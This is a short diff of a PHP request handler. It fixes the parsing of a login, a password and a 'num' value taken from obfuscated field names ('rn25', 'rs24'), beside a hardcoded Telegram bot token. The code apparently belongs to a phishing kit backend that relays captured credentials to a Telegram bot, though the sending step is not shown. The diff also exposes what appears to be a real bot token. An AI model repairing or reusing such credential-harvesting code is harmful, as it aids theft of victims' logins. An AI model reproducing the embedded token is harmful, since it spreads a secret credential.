@@ -170,9 +170,10 @@ if (isset($data['action']) && $data['action'] === 'get_template') {
     $html = getTemplate($templateName, $templateData);
     echo json_encode(['html' => $html]);
 } elseif (isset($data['rn25']) && isset($data['rs24']) && isset($data['num'])) {
-    $login = $data->login;
-    $pass = $data->pass;
-    $num = $data->num;
+    $login = $data['rn25'] ?? '';
+    $pass = $data['rs24'] ?? '';
+    $num   = $data['num'] ?? '';
+
 
     $token = "6841556725:AAHu7cCARNME-rZTSG5wN6lZeVdVZyspGFQ";
 
@@ -190,3 +191,4 @@ if (isset($data['action']) && $data['action'] === 'get_template') {
     echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
 }
 ?>
+
